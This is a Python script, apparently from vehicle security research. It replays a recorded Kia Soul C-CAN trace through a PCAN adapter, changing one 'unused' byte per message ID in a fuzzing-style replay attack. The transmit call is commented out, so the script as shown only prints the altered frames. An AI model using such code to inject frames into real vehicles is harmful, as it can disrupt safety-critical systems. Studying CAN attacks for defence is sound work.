import pandas as pd
import matplotlib.pyplot as plt
from matplotlib.pyplot import figure
import numpy as np
import time
from PCANBasic import *
from rich.console import Console


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


cols = ["No", "Time_Offset", "Type", "ID", "Data_Length", 'One', 'Two', 'Three', 'Four', 'Five', 'Six', 'Seven', 'Eight']

unused_byte = {'0165': [3, '00'], '051A': [0, '00'], '02B0': [3, '07'], '00A0': [6, '00'],
 '05E4': [0, '00'], '0153': [4, '00'], '02A0': [1, '00'], '0120': [0, '00'], '043F': [2, '60'],
 '0316': [7, '7F'], '04B1': [4, '00'], '0050': [0, '00'], '0164': [0, '00'], '0018': [6, '20'],
 '0044': [0, '00'], '0110': [0, 'E0'], '05F0': [0, '00'], '0329': [7, '10'], '0440': [3, '00'],
 '00A1': [2, '80'], '04F2': [4, '00'], '018F': [6, '00'], '0382': [0, '40'], '04F0': [0, '00'],
 '05A2': [0, '25'], '0034': [0, '00'], '0260': [3, '30'], '01F1': [0, '00'], '02C0': [0, '3D'],
 '0517': [1, '00'], '05A0': [0, '00'], '0080': [1, '17'], '04F1': [2, '00'], '0043': [0, '00'],
 '0350': [5, '00'], '059B': [0, '00'], '0081': [3, '00'], '0042': [1, 'FF'], '0510': [0, '00'],
 '0690': [0, '03'], '0587': [0, '00'], '0370': [0, 'FF']}

def Convert_to_Dataframe(path):
    test = pd.read_csv(path, encoding='cp949', index_col=0)
    b = []
    for i in test.index:
        temp = i.split(" ")
        b.append(list(filter(('').__ne__, temp)))
    #final = pd.DataFrame(b, columns = ["No", "Time_Offset", "Type", "ID", "Data_Length", 'One', 'Two', 'Three', 'Four', 'Five', 'Six', 'Seven', 'Eight'])
    final = pd.DataFrame(b, columns = cols)
    return final

def Replay_attack(data_iloc):
    all_datas = ""
    time_offset = 0.05
    Fuzzing_attack = TPCANMsg()
    Fuzzing_attack.ID = int(data_iloc[3],16)
    Fuzzing_attack.LEN = int(data_iloc[4])
    Fuzzing_attack.MSGTYPE = PCAN_MESSAGE_STANDARD
    all_datas += str(hex(Fuzzing_attack.ID)) + "\t" + str(Fuzzing_attack.MSGTYPE) + "\t" + str(hex(Fuzzing_attack.LEN)) 
    #EDITED BY DDUMWAMU: INITIALIZE YOUR VARIABLES BEFORE USING IT INSIDE THE FUNCTION YOU ***** hahahaa'
    unused_index = 0

    if data_iloc[3] in unused_byte:
        unused_index = unused_byte[data_iloc[3]][0]
        if unused_index == None:
            return

    for i in range(int(data_iloc[4])):
        if unused_index == i :
            Fuzzing_attack.DATA[i] = int(data_iloc[5+i], 16) + 1
            all_datas += "\t" + bcolors.OKGREEN + str(hex(Fuzzing_attack.DATA[i])) + bcolors.ENDC
        else:
            Fuzzing_attack.DATA[i] = int(data_iloc[5+i], 16)
            all_datas += "\t" + str(hex(Fuzzing_attack.DATA[i]))
    unused_index = 0
    all_datas += "\n"
    print(all_datas)
    # res = CAN.Write(CAN_BUS, Fuzzing_attack)
    # if res != PCAN_ERROR_OK:
    #     print("Oh nooo")
    #     result = CAN.GetErrorText(res)
    #     print(result)
    #     exit()
    time.sleep(time_offset)


if __name__ == "__main__":
    
    CAN = PCANBasic()                            #CAN 생성자 
    CAN_BUS = PCAN_USBBUS6
    CAN.Initialize(CAN_BUS, PCAN_BAUD_500K, 2047, 0, 0) #Channel, Btr, HwType, IOPort, INterrupt
    
    dataset_path = "Dataset\\"
    dataset_name = "2022.08.12 구쏘울 C-CAN (정상).trc"
    df_dataset = Convert_to_Dataframe(dataset_path+dataset_name)[17:]
    nID = list(dict.fromkeys(df_dataset["ID"]))
    ilo_df = df_dataset.iloc
    l = len(df_dataset)
    for i in range(l - 1):
        print(bcolors.OKBLUE)
        print(bcolors.OKBLUE + str(ilo_df[i][3]), end="\t")
        print(ilo_df[i][2], end="\t")
        print(ilo_df[i][4], end="\t")
        for j in range(int(ilo_df[i][4])):
            print(ilo_df[i][5+j], end = '\t')
        print(bcolors.ENDC)
        Replay_attack(ilo_df[i])
    
    
    

